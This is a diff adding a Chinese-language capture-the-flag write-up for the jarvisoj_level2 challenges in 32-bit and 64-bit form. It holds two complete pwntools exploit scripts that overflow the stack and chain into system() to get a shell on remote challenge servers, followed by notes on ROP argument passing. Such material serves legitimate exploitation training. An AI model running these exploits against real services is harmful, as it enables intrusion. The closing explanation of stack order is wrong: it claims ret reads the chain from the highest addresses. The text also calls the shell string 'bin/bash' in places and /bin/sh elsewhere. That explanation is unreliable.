@@ -1,0 +1,66 @@
+总结涉及两道题:jarvisoj_level2以及 jarvisoj_level2_x64
+为同一知识点的32位和64位形式,均为栈溢出并跳转到`system()`函数执行`bin/bash`
+
+32位exp代码:
+```python
+from pwn import *
+
+r = remote("node5.buuoj.cn",25666)
+
+offset = 136 +4
+
+payload = b'a'*offset
+
+bin_bash_addr = 0x804a024
+
+sys_addr = 0x8048320
+
+payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_bash_addr)
+
+r.sendlineafter("Input:",payload)
+
+r.interactive()
+```
+64位exp代码:
+```python
+from pwn import *
+
+r = remote("node5.buuoj.cn",25442)
+
+offset = 128 + 8
+
+bin_bash = 0x600A90
+
+sys_addr = 0x4004C0
+
+pop_rdi_ret = 0x4006b3
+
+payload =  b'a'*offset  +p64(pop_rdi_ret)+ p64(bin_bash) + p64(sys_addr)
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+总结:
+32位程序call system可以直接在栈上取参数,对应的ROP:
+```python
+payload += p32(system_addr)    # ret → system()
+payload += p32(ret_addr)       # 返回地址（随意填）
+payload += p32(bin_bash_addr)  # system() 的第一个参数
+```
+64位程序则需要通过寄存器`rdi`取参数,对应的ROP:
+```python
+payload += p64(pop_rdi)       # 控制 RDI
+payload += p64(bin_bash)      # RDI = "/bin/sh"
+payload += p64(sys_addr)      # 跳 system()
+```
+
+
+另外:
+payload 写入的顺序 = 栈上的顺序（从低地址到高地址）
+**程序执行 ret 时，从“栈顶”（最高地址部分）依次取 ROP 链的内容。**
+
+也就是说：
+
+`payload 的前面部分 → 在栈底（低地址） payload 的后面部分 → 在栈顶（高地址） → ret 会从这里开始执行`
